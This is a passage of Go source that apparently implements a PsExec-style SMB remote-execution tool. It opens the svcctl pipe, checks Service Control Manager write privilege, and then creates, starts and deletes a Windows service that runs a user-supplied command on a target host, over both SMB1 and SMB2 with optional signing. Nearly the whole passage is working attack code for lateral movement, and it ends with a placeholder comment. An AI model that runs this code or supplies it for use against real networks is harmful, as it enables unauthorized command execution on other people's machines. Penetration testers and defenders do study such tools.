					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SCMData := pkg.NewPacketSCMOpenSCManagerW(SMBServiceBytes, smbServiceLength)
					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), int(0), int(0), []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0f, 0x00}, []byte{})
					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData)+len(SCMData))
					RPCDataLength := len(SMBData) + len(SCMData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData, SCMData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "ReadAndXRequest"
					stageNext = "CheckAccess"

				case "ReadAndXRequest":
					time.Sleep(time.Duration(*config.Sleep) * time.Millisecond)
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2e}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBReadAndXRequest(SMBFID)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = stageNext

				case "RPCBind":
					SMBFIDSlice := client_recieve[42:44]
					SMBFID = make([]byte, len(SMBFIDSlice))
					copy(SMBFID, SMBFIDSlice)

					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)
					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					RPCData := pkg.NewPacketRPCBind([]byte{0x48, 0x00}, 1, []byte{0x01}, []byte{0x00, 0x00}, namedPipeUUID, []byte{0x02, 0x00})
					SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData))
					RPCDataLength := len(SMBData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					clientSend = append(clientSend, RPCData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "ReadAndXRequest"
					stageNext = "OpenSCManagerW"
				case "StartServiceW":
					if bytes.Equal(client_recieve[112:116], []byte{0x00, 0x00, 0x00, 0x00}) {
						fmt.Printf("[+] Service created on %s\n", *config.Target)
						smbServiceManagerContextHandleSlice := client_recieve[92:112]
						smbServiceManagerContextHandle = make([]byte, len(smbServiceManagerContextHandleSlice))
						copy(smbServiceManagerContextHandle, smbServiceManagerContextHandleSlice)

						packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

						if SMBSigning {
							smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
						}

						SCMData = pkg.NewPacketSCMStartServiceW(smbServiceManagerContextHandle)
						RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x03, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x13, 0x00}, []byte{})
						SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
						SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData)+len(SCMData))
						RPCDataLength := len(SMBData) + len(SCMData) + len(RPCData)
						NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

						if SMBSigning {
							SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData, SCMData)
						}

						clientSend := append(NetBIOSsessionService, SMBHeader...)
						clientSend = append(clientSend, SMBData...)
						clientSend = append(clientSend, RPCData...)
						clientSend = append(clientSend, SCMData...)
						fmt.Printf("[*] Trying to execute command on %s\n", *config.Target)
						client_stream.Write(clientSend)
						client_stream.Flush()
						conn.Read(client_recieve)

						stage = "ReadAndXRequest"
						stageNext = "DeleteServiceW"
					} else if bytes.Equal(client_recieve[112:116], []byte{0x31, 0x04, 0x00, 0x00}) {
						fmt.Println("[-] Service creation failed on " + *config.Target)
						stage = "Exit"
					} else {
						fmt.Println("[-] Service creation fault context mismatch")
						stage = "Exit"
					}
				case "TreeConnectAndXRequest":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x75}, []byte{0x18}, []byte{0x01, 0x48}, []byte{0xff, 0xff}, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBTreeConnectAndXRequest(SMBPathBytes)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "CreateAndXRequest"
				case "TreeDisconnect":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x71}, []byte{0x18}, []byte{0x07, 0xc8}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBTreeDisconnectRequest()
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "Logoff"

				}
			}
		} else {
			stage = "TreeConnect"
			var stageCurrent string
			var fileID []byte
			var clientSend []byte
			var SMBServiceContextHandle []byte
			_ = stageCurrent
			_ = fileID
			for stage != "Exit" {
				switch stage {
				case "CheckAccess":
					if bytes.Equal(client_recieve[128:132], []byte{0x00, 0x00, 0x00, 0x00}) && !bytes.Equal(client_recieve[108:128], []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) {
						smbServiceManagerContextHandleSlice := client_recieve[108:128]
						smbServiceManagerContextHandle = make([]byte, len(smbServiceManagerContextHandleSlice))
						copy(smbServiceManagerContextHandle, smbServiceManagerContextHandleSlice)
						if *config.Command != "" {
							fmt.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							SCMData = pkg.NewPacketSCMCreateServiceW(smbServiceManagerContextHandle, SMBServiceBytes, smbServiceLength, commandBytes, commandLengthBytes)

							if len(SCMData) < smbSplitIndex {
								stage = "CreateServiceW"
							} else {
								// TODO add support for longer commands
								fmt.Println("[-] Command is too long, please use a shorter command and try again")
								stage = "Exit"
							}

						} else {
							fmt.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							smbCloseServiceHandleStage = 2
							stage = "CloseServiceHandle"
						}
					} else if bytes.Equal(client_recieve[108:112], []byte{0x05, 0x00, 0x00, 0x00}) {
						fmt.Printf("[-] %s does not have Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
						stage = "Exit"
					} else {
						fmt.Printf("[-] Soming went wrong with %s", *config.Target)
						stage = "Exit"
					}
				case "CloseRequest":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x06, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					SMB2Data := smb.NewPacketSMB2CloseRequest(fileID)
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					stage = "SendReceive"

				case "CloseServiceHandle":
					SCMData := []byte{}
					if smbCloseServiceHandleStage == 1 {
						fmt.Println("Service deleted on " + *target)
						SCMData = pkg.NewPacketSCMCloseServiceHandle(SMBServiceContextHandle)
					} else {
						SCMData = pkg.NewPacketSCMCloseServiceHandle(smbServiceManagerContextHandle)
					}

					smbCloseServiceHandleStage++
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x00, 0x00}, []byte{})
					SMB2Data := smb.NewPacketSMB2WriteRequest(fileID, len(RPCData)+len(SCMData))
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					RPCDataLength := len(SMB2Data) + len(SCMData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), RPCDataLength)

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data, RPCData, SCMData)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)
					stage = "SendReceive"

				case "CreateRequest":
					stageCurrent = stage
					SMBNamedPipeBytes := []byte{0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00} // \svcctl
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x05, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					packetSMB2Data := smb.NewPacketSMB2CreateRequestFileUnflat(SMBNamedPipeBytes)
					packetSMB2Data.Set("Share_Access", []byte{0x07, 0x00, 0x00, 0x00})
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					SMB2Data := helpers.FlattenOrderedMap(*packetSMB2Data)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data)
					}

					clientSend := append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)

					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)

					if pkg.GetStatusPending(client_recieve[12:16]) {
						stage = "StatusPending"
					} else {
						stage = "StatusReceived"
					}
				case "CreateServiceW":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0c, 0x00}, []byte{})
					SMB2Data := smb.NewPacketSMB2WriteRequest(fileID, len(RPCData)+len(SCMData))
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					RPCDataLength := len(SMB2Data) + len(SCMData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), RPCDataLength)

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data, RPCData, SCMData)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)
					stage = "SendReceive"

				case "DeleteServiceW":
					if bytes.Equal(client_recieve[108:112], []byte{0x1d, 0x04, 0x00, 0x00}) {
						fmt.Println("[+] Command executed with service on " + *target)
					} else if bytes.Equal(client_recieve[108:112], []byte{0x02, 0x00, 0x00, 0x00}) {
						fmt.Println("[-] Service failed to start on" + *target)
					}

					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					SCMData := pkg.NewPacketSCMDeleteServiceW(SMBServiceContextHandle)
					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x02, 0x00}, []byte{})
					SMB2Data := smb.NewPacketSMB2WriteRequest(fileID, len(RPCData)+len(SCMData))
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					RPCDataLength := len(SMB2Data) + len(SCMData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), RPCDataLength)

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data, RPCData, SCMData)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)
					stage = "SendReceive"
				case "Logoff":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x02, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					SMB2Data := smb.NewPacketSMB2SessionLogoffRequest()
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					stage = "SendReceive"

				case "StatusPending":
					conn.Read(client_recieve)
					if !bytes.Equal(client_recieve[12:16], []byte{0x03, 0x01, 0x00, 0x00}) {
						stage = "StatusReceived"
					}
				case "StatusReceived":
					switch stageCurrent {
					case "CloseRequest":
						stage = "TreeDisconnect"
					case "CloseServiceHandle":
						if smbCloseServiceHandleStage == 2 {
							stage = "CloseServiceHandle"
						} else {
							stage = "CloseRequest"
						}
					case "CreateRequest":
						fileIDSlice := client_recieve[132:148]
						fileID = make([]byte, len(fileIDSlice))
						copy(fileID, fileIDSlice)
						if stage != "Exit" {
							stage = "RPCBind"
						}
					case "CreateServiceW":
						stage = "ReadRequest"
						stageNext = "StartServiceW"
					// case "CreateServiceW_First":
					// 	if SMBSplitStageFinal <= 2 {
					// 		stage = "CreateServiceW_Last"
					// 	} else {
					// 		SMBSplitStage = 2
					// 		stage = "CreateServiceW_Middle"
					// 	}
					// case "CreateServiceW_Middle":
					// 	if SMBSplitStage >= SMBSplitStageFinal {
					// 		stage = "CreateServiceW_Last"
					// 	} else {
					// 		stage = "CreateServiceW_Middle"
					// 	}
					// case "CreateServiceW_Last":
					// 	stage = "ReadRequest"
					// 	stageNext = "StartServiceW"
					case "DeleteServiceW":
						stage = "ReadRequest"
						stageNext = "CloseServiceHandle"
						smbCloseServiceHandleStage = 1
					case "Logoff":
						stage = "Exit"
					case "OpenSCManagerW":
						stage = "ReadRequest"
						stageNext = "CheckAccess"
					case "ReadRequest":
						stage = stageNext
					case "RPCBind":
						stage = "ReadRequest"
						stageNext = "OpenSCManagerW"
					case "StartServiceW":
						stage = "ReadRequest"
						stageNext = "DeleteServiceW"
					case "TreeConnect":
						treeID = client_recieve[40:44]
						stage = "CreateRequest"
					case "TreeDisconnect":
						stage = "Logoff"
					}
				case "OpenSCManagerW":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					SCMData := pkg.NewPacketSCMOpenSCManagerW(SMBServiceBytes, smbServiceLength)
					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0f, 0x00}, []byte{})
					SMB2Data := smb.NewPacketSMB2WriteRequest(fileID, len(RPCData)+len(SCMData))
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					RPCDataLength := len(SMB2Data) + len(SCMData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), RPCDataLength)

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data, RPCData, SCMData)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)
					stage = "SendReceive"

				case "ReadRequest":
					time.Sleep(time.Duration(*config.Sleep) * time.Millisecond)
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x08, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					packetSMB2Data := smb.NewPacketSMB2ReadRequestUnflat(fileID)
					packetSMB2Data.Set("Length", []byte{0xff, 0x00, 0x00, 0x00})
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					SMB2Data := helpers.FlattenOrderedMap(*packetSMB2Data)
					NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data)
					}

					clientSend = append(NetBIOSsessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					stage = "SendReceive"

				case "RPCBind":
					stageCurrent = stage
					// SMBNamedPipeBytes = []byte{0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00} // \svcctl
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					RPCData := pkg.NewPacketRPCBind([]byte{0x48, 0x00}, 1, []byte{0x01}, []byte{0x00, 0x00}, namedPipeUUID, []byte{0x02, 0x00})
					SMB2Data := smb.NewPacketSMB2WriteRequest(fileID, len(RPCData))
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					RPCDataLength := len(SMB2Data) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), RPCDataLength)

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data, RPCData)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					clientSend = append(clientSend, RPCData...)
					stage = "SendReceive"
				case "SendReceive":
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)

					if pkg.GetStatusPending(client_recieve[12:16]) {
						stage = "StatusPending"
					} else {
						stage = "StatusReceived"
					}
				case "StartServiceW":
					if bytes.Equal(client_recieve[132:136], []byte{0x00, 0x00, 0x00, 0x00}) {
						fmt.Printf("Service created on %s\n", *target)
						SMBServiceContextHandleSlice := client_recieve[112:132]
						SMBServiceContextHandle = make([]byte, len(SMBServiceContextHandleSlice))
						copy(SMBServiceContextHandle, SMBServiceContextHandleSlice)
						stageCurrent = stage
						messageID++
						packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

						if SMBSigning {
							packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
						}

						SCMData := pkg.NewPacketSCMStartServiceW(SMBServiceContextHandle)
						RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x13, 0x00}, []byte{})
						SMB2Data := smb.NewPacketSMB2WriteRequest(fileID, len(RPCData)+len(SCMData))
						SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
						RPCDataLength := len(SMB2Data) + len(SCMData) + len(RPCData)
						NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), RPCDataLength)

						if SMBSigning {
							SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data, RPCData, SCMData)
						}

						clientSend = append(NetBIOSSessionService, SMB2Header...)
						clientSend = append(clientSend, SMB2Data...)
						clientSend = append(clientSend, RPCData...)
						clientSend = append(clientSend, SCMData...)
						fmt.Printf("[*] Trying to execute command on %s\n", *target)
						stage = "SendReceive"
					} else if bytes.Equal(client_recieve[132:136], []byte{0x31, 0x04, 0x00, 0x00}) {
						fmt.Println("[-] Service creation failed on" + *target)
						stage = "Exit"
					} else {
						fmt.Println("[-] Service creation fault context mismatch")
						stage = "Exit"
					}

				case "TreeConnect":
					treeID = client_recieve[40:44]
					messageID++
					stageCurrent = stage
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x03, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					SMB2Data := smb.NewPacketSMB2TreeConnectRequest(SMBPathBytes)
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data)
					}

					clientSend := append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)

					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)

					if pkg.GetStatusPending(client_recieve[12:16]) {
						stage = "StatusPending"
					} else {
						stage = "StatusReceived"
					}

				case "TreeDisconnect":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x04, 0x00}, []byte{0x01, 0x00}, SMBSigning, messageID, processIDByteArray, treeID, sessionID)

					if SMBSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					SMB2Data := smb.NewPacketSMB2TreeDisconnectRequest()
					SMB2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))

					if SMBSigning {
						SMB2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, SMB2Header, SMB2Data)
					}

					clientSend = append(NetBIOSSessionService, SMB2Header...)
					clientSend = append(clientSend, SMB2Data...)
					stage = "SendReceive"

				}
			}
		}
		_ = smbCloseServiceHandleStage

	}

	// Rest of the code...
}
